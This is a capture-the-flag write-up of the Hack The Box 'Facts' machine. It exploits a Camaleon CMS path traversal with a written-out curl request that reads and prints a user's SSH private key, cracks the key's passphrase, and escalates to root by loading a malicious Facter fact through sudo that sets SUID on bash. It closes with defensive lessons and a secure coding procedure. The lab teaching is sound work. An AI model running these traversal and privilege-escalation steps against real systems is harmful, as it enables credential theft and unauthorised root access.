---
title: Facts HTB Writeup
date: 2026-02-01 02:38:46
tags:
  - Linux security
  - LFI
  - Hackthebox
categories: writeups
keywords: 'HTB'
top_img: images/cyberpunk-red.png
cover: images/facts.jpg
---
# Facts HTB (Season 10)

![](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/bdcd209c32f156fbfb2268f099971f75.png)

It’s the start of the season 10 and we kick it off with an easy linux machine 

# Recon

```elixir
┌──(ouhboy㉿malw0re)-[~/…/Labs/HTB/S10/FACTS]
└─$ sudo nmap -p- --min-rate 5000 -T4 10.129.20.220 -oN ports.nmap
[sudo] password for ouhboy: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 00:02 EAT
Nmap scan report for 10.129.20.220
Host is up (0.22s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
54321/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.05 seconds
                                                                                                                                                                                                                                                                                                         
┌──(ouhboy㉿malw0re)-[~/…/Labs/HTB/S10/FACTS]
└─$ echo "10.129.20.220 facts.htb" | sudo tee -a /etc/hosts
10.129.20.220 facts.htb
                                                                                                                                                                                                                                            
┌──(ouhboy㉿malw0re)-[~/…/Labs/HTB/S10/FACTS]
└─$ sudo nmap -sC -sV -p 22,80,54321 10.129.20.220 -oN targeted.nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 00:05 EAT
Nmap scan report for facts.htb (10.129.20.220)
Host is up (0.22s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: facts
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://facts.htb:9001
|_http-server-header: MinIO
| fingerprint-strings: 

```

### Initial Analysis

- **Port 22 (SSH):** Our eventual entry point once we have the key.
- **Port 80 (HTTP):** The Camaleon CMS where the LFI vulnerability lives.
- **Port 54321 (Unknown):** This is interesting. On HTB, high ports like this often host API services, developer tools, or secondary web apps.

# Port 80

We have a website running on port 80 

![](/images/web.png)

Having such we need to find some form of login, we get admin we redirects to a login page where after you create the account you are sent to your dashboard.

```elixir
┌──(ouhboy㉿malw0re)-[~/…/Labs/HTB/S10/FACTS]
└─$ ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 302    

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://facts.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 302
________________________________________________

admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1511ms]
admin.cgi               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1431ms]
admin.pl                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1342ms]
admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1415ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

![image.png](/images/web2.png)

!![image.png](/images/web3.png)

## Vulnerability Breakdown

Once Logged in you’ll identify its running on **camaleon_cms version 2.9.1.**  
	
The vulnerability in Camaleon CMS v2.9.0 (tracked as **CVE-2024-46987**) is a classic **Path Traversal** flaw (also known as Local File Inclusion or LFI) residing within the `download_private_file` action of the `Admin::MediaController`. The technical root cause stems from an **insecure direct object reference (IDOR)** combined with a lack of **input sanitization** on the `file` parameter. Specifically, the Ruby on Rails backend takes the user-supplied string from `params[:file]` and concatenates it to a base directory path (typically `private/`) to locate files on the disk. Because the application fails to utilize a "path normalization" or "allow-listing" mechanism—such as checking for the presence of the `..` sequence or ensuring the resolved path remains within the intended subdirectory—an attacker can inject **traversal sequences** (`../../`). These sequences instruct the underlying Linux operating system to navigate up the directory tree, effectively escaping the web root's restricted environment.

When processed by the Ruby `send_file` method or similar file-handling utilities, these escaped paths allow an authenticated attacker to read arbitrary sensitive files that the web server process has permissions to access. In the context of this specific HTB machine, this capability is leveraged to bypass standard access controls and exfiltrate the **SSH private key** from the user's home directory. Since the application requires an active session to reach this administrative endpoint, the exploit chain typically begins with obtaining a valid session cookie—either through credential harvesting or default configurations—followed by a crafted `GET` request that traverses back to the system's root and then forward into the targeted user's private folders.

the vulnerable code.

```elixir
def download_private_file
  cama_uploader.enable_private_mode!
  file = cama_uploader.fetch_file("private/#{params[:file]}")
  send_file file, disposition: 'inline'
end
```

Now using burpsuite exploiting the vulnerability we trying and fuzz the endpoint that’s trying to get the downloadable file and we get the /etc/passwd file with two users.

![image.png](Facts%20HTB%20(Season%2010)/image%203.png)

# Initial Foothold

Now having an active LFI we can try look for ssh keys from the two users and ssh into the box. From `/etc/passwd`, we learned that the user `trivia` has a home directory at `/home/trivia`.

The vulnerability prepends `private/` to our input. To get to the root (`/`), we need to go up several levels (`../`). Once we are at the root, we navigate back down into the home folder. Use curl to target the sensitive files inside the home directory. The most common targets are:

- `.ssh/id_rsa` or `.ssh/id_ed25519` (Private Keys)
- `.bash_history` (To see what the user did previously)

Using the common targets, while enumerating for the two users william doesn’t have ssh keys on trivia has the keys so we get the keys

```elixir
┌──(ouhboy㉿malw0re)-[~/…/Labs/HTB/S10/FACTS]
└─$ curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: facts.htb' -H $'Accept-Language: en-US,en;q=0.9' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    -b $'auth_token=o8rw-2ETkFp7tYtdRyPjOw&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F142.0.0.0+Safari%2F537.36&10.10.14.65; _factsapp_session=139QmrBAnIX%2FTeZEVhAu0Ziz32USNPGA13drhxV%2B3RVOViyR8jE33gIojBYDXpYGbYt4iMllxulu7CAl31igo6cyNTUURhargo6EoH2cKpUwipjbEtFpgoZRlwkp%2FAtrvJJ7kF94Z%2FMg7uD6dKXOj32fqn38hN%2Fto4f6JflvcQtilL9XH4CjES0gc1lJdTYuIZmX3%2Bt%2BeR4eUCcauQ04lcRwn8IPzZ7Cpqa0fylH4B3wvXCLRFuADJDuVNmgFTEoyhLqIDl72ZnsnC58VSD2bTyj99WvMzatjw0BD9STKBOVOhIYHILOgru2KbEtYIQqtLGM7E28r1j17yhD3YZ95zmNjn0VnYS4yLQogFVDsmKfniCt1mFY%2Fgw%3D--w40k3VXd7LPbx%2Fm8--NesgDxUcijV0ZkuUkMX3eQ%3D%3D' \
    $'http://facts.htb/admin/media/download_private_file?file=../../../../../.././../../home/trivia/.ssh/id_ed25519'
HTTP/1.1 200 OK
Server: nginx/1.26.3 (Ubuntu)
Date: Sat, 31 Jan 2026 22:13:30 GMT
Content-Type: application/octet-stream
Content-Length: 464
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: inline; filename="id_ed25519"; filename*=UTF-8''id_ed25519
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: 29b69d4f-8d14-475f-9fd8-ea8113c3eb8a
x-runtime: 0.052794

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCiG3aA0a
rPr/CPcGqymU5gAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIBf2siiTp7ZJWiRX
CYl0swqPw1ScRwe83uvnP/ylsiraAAAAoLYDo+W78C9hjZs0bTN5+d1xwHljr3lM+pWCI4
k9DPjE7LLBcG2dybsj/n+dspwDmp/kSj8Il2AHWX88i7g1wqzBpdQ9zJIjf3wHOcgi8FzM
LtJ4meSAEurVZHHVtoBzkPlGJ0IgQi2XEn3lAaOhBxDAUVtR6sTfDUs6lTC2TnDBumyDA8
FVtvq4aBmJ5z9hZT3kxIbRUfSXaWd3lgn3QbE=
-----END OPENSSH PRIVATE KEY-----
                                      
```

When you try to use the key to ssh into the box with trivia user we are required to give a password

```elixir
                                                                                                                                                                                                                                            
┌──(ouhboy㉿malw0re)-[~/…/Labs/HTB/S10/FACTS]
└─$ chmod 600 trivia_id-rsa 
                                                                                                                                                                                                                                            
┌──(ouhboy㉿malw0re)-[~/…/Labs/HTB/S10/FACTS]
└─$ ssh -i trivia_id-rsa trivia@10.129.21.47
The authenticity of host '10.129.21.47 (10.129.21.47)' can't be established.
ED25519 key fingerprint is: SHA256:fygAnw6lqDbeHg2Y7cs39viVqxkQ6XKE0gkBD95fEzA
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:8: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.21.47' (ED25519) to the list of known hosts.
Enter passphrase for key 'trivia_id-rsa': 

```

We need to crack this, pretty simple.

```elixir
┌──(ouhboy㉿malw0re)-[~/…/Labs/HTB/S10/FACTS]
└─$ ssh2john trivia_id-rsa > trivia-hash    
                                                                                                                                                                                                                                            
┌──(ouhboy㉿malw0re)-[~/…/Labs/HTB/S10/FACTS]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt trivia-hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (trivia_id-rsa)     
1g 0:00:07:16 DONE (2026-02-01 01:25) 0.002288g/s 7.323p/s 7.323c/s 7.323C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                        
```

After that we successfully login and read the user flag.

```elixir
┌──(ouhboy㉿malw0re)-[~/…/Labs/HTB/S10/FACTS]
└─$ ssh -i trivia_id-rsa trivia@10.129.21.47                  
Enter passphrase for key 'trivia_id-rsa': 
Enter passphrase for key 'trivia_id-rsa': 
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jan 31 10:28:13 PM UTC 2026

  System load:           0.06
  Usage of /:            73.0% of 7.28GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             220
  Users logged in:       1
  IPv4 address for eth0: 10.129.21.47
  IPv6 address for eth0: dead:beef::250:56ff:fe94:9b6

0 updates can be applied immediately.

trivia@facts:~$ ls
trivia@facts:~$ pwd
/home/trivia
trivia@facts:~$ cd ..
trivia@facts:/home$ ls
trivia  william
trivia@facts:/home$ ls william/
user.txt
trivia@facts:/home$ cat william/user.txt 
```

# Privesc Root

After getting the user fag we need to privesc to root and get the root flag but before that we need to do some enumeration on the box using the common vectors.

```elixir
trivia@facts:/home$ id && hostname && pwd
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)
facts
/home
trivia@facts:/home$ ps aux | grep root
ss -tlpn
trivia     15840  0.0  0.0   6764  2460 pts/0    S+   22:33   0:00 grep --color=auto root
State                   Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                  Process                                              
LISTEN                  0                        1024                                           127.0.0.1:3000                                           0.0.0.0:*                      users:(("ruby3.3",pid=1433,fd=10))                  
LISTEN                  0                        4096                                             0.0.0.0:22                                             0.0.0.0:*                                                                          
LISTEN                  0                        511                                              0.0.0.0:80                                             0.0.0.0:*                                                                          
LISTEN                  0                        4096                                       127.0.0.53%lo:53                                             0.0.0.0:*                                                                          
LISTEN                  0                        4096                                          127.0.0.54:53                                             0.0.0.0:*                                                                          
LISTEN                  0                        4096                                             0.0.0.0:54321                                          0.0.0.0:*                                                                          
LISTEN                  0                        4096                                                [::]:22                                                [::]:*                                                                          
LISTEN                  0                        511                                                 [::]:80                                                [::]:*                                                                          
LISTEN                  0                        4096                                                [::]:54321                                             [::]:*                                                                          
trivia@facts:/home$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
trivia@facts:/home$ 

```

We land on facter, Facter is a tool used to gather "facts" about a system. It is written in Ruby. Facter is a tool used to gather "facts" about a system. It is written in **Ruby**.

- When you run `facter`, it looks for custom "fact" files (Ruby scripts) to execute.
- Since you are running it with `sudo`, the Ruby scripts it loads will execute with **Root privileges**.
- Even though `env_reset` is on (preventing you from using the `FACTERLIB` environment variable), the binary itself has a command-line flag called `-custom-dir` that tells it where to look for these scripts.

by utilizing the `--custom-dir` command-line argument, we can redirect Facter to a directory under our control containing a malicious Ruby script. When Facter is invoked via `sudo`, it loads and executes our script with **UID 0** (root) authority. By embedding a command such as `chmod +s /bin/bash` within the script's `setcode` block, we effectively apply the **SUID bit** to the system's bash shell. This allows us to then execute `bash -p`, which bypasses standard privilege-dropping mechanisms and drops us into a persistent, interactive root session.

Now We will write a Ruby script that tells Facter to execute a system command. We will use the "SetUID Bash" method because it's more stable than spawning a shell directly through the `sudo` process and get the flag.

```elixir
trivia@facts:/tmp/exploit$ echo 'Facter.add(:ouhboy_fact) do setcode { system("chmod +s /bin/bash") } end' > /tmp/exploit/root.rb
trivia@facts:/tmp/exploit$ sudo /usr/bin/facter --custom-dir=/tmp/exploit/ ouhboy_fact
true
trivia@facts:/tmp/exploit$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1740896 Mar  5  2025 /bin/bash
trivia@facts:/tmp/exploit$ bash -p
bash-5.2# id 
uid=1000(trivia) gid=1000(trivia) euid=0(root) egid=0(root) groups=0(root),1000(trivia)
bash-5.2# cat /root/root.txt

```

# Lesson Learnt

### 1. The Danger of Insecure File Handling (LFI)

The primary entry point was a **Path Traversal** vulnerability.

- **The Lesson:** Never trust user input when it interacts with the file system. Developers should use "allow-lists" for filenames or use built-in functions to strip directory information (like `File.basename` in Ruby).
- **The Defense:** Implement a **Chroot Jail** or use a containerized environment (Docker/Podman) so that even if a traversal occurs, the attacker is "trapped" inside a virtual root and cannot see `/etc/passwd` or `/home`.

### 2. The "Blast Radius" of SSH Keys

We used an LFI to steal a private key.

- **The Lesson:** SSH keys are often treated as "set and forget," but they are essentially "identity files." If your web application has the permissions to read your SSH keys, you've merged your web security with your server security.
- **The Defense:** Follow the **Principle of Least Privilege**. The web server user (e.g., `www-data`) should never have read access to a user’s `.ssh` directory. Additionally, using **Passphrases** on SSH keys (like `dragonballz` in this case) adds a critical second layer of defense.

### 3. Misconfigured Sudoers (The "Facter" Flaw)

The jump from user to root was made possible by a specific `NOPASSWD` entry.

- **The Lesson:** Granting sudo access to complex binaries (like Facter, Python, or Perl) that can execute external scripts is equivalent to giving away the root password.
- **The Defense:** Only grant sudo access to the specific arguments required for a task, or better yet, use a dedicated configuration management tool (like Ansible or Chef) that doesn't require interactive user sudo rights to run system "facts."

### 4. Information Leakage through Fuzzing

By filtering for "delta" sizes (like your `-fs 154` trick), we mapped the application's hidden areas.

- **The Lesson:** Generic error pages and redirects can leak the existence of sensitive directories.
- **The Defense:** Ensure the web server returns uniform responses for "Not Found" and "Forbidden" errors to prevent attackers from using size-based analysis to find admin panels.

### Standard Operating Procedure (SOP): Secure File Handling and LFI Prevention

---

### 1. The "Golden Rule" of File Paths

**Never** trust a user-supplied string to build a file path. Attackers will always attempt to use `../` to escape the intended directory.

### 2. Implementation Standards

### A. Use Path Normalization (The Best Defense)

Before processing a file request, strip all directory information from the input. This ensures the application only sees the filename, not the path.

- **Insecure:** `file = "storage/private/#{params[:file]}"`
- **Secure (Ruby):** `file = File.join("storage/private/", File.basename(params[:file]))`
    - *Why:* `File.basename` removes any `../` or leading slashes, forcing the application to look only within the "private" folder.

### B. Implement an Allow-List

If the application only needs to serve specific files (e.g., PDFs or Images), validate the extension and the name against a known list or regex.

Ruby

`# Example: Only allow alphanumeric filenames with .pdf or .jpg extensions
unless params[:file] =~ /\A[a-zA-Z0-9_-]+\.(pdf|jpg)\z/
  render_404
end`

### C. Use Indirect Object References

Instead of asking for a file by name (`?file=report.pdf`), use a database ID (`?file_id=125`). The backend then fetches the file path associated with that ID from a secure database.

---

### 3. System-Level Protections (Defense in Depth)

1. **Principle of Least Privilege:** Ensure the web server process (e.g., `www-data`) has the absolute minimum permissions required. It should never have read access to `/etc/`, `/root/`, or `/home/`.
2. **Read-Only File Systems:** Whenever possible, mount directories containing sensitive application code as read-only.
3. **AppArmor/SELinux:** Use mandatory access control to restrict the web server's ability to open files outside of designated "public" or "storage" directories.

### 4. Code Review Checklist

During PR reviews, flag any instance of the following functions if they are paired with user-controlled variables:

- `send_file`
- `File.read`
- `render file:`
- `Dir.entries`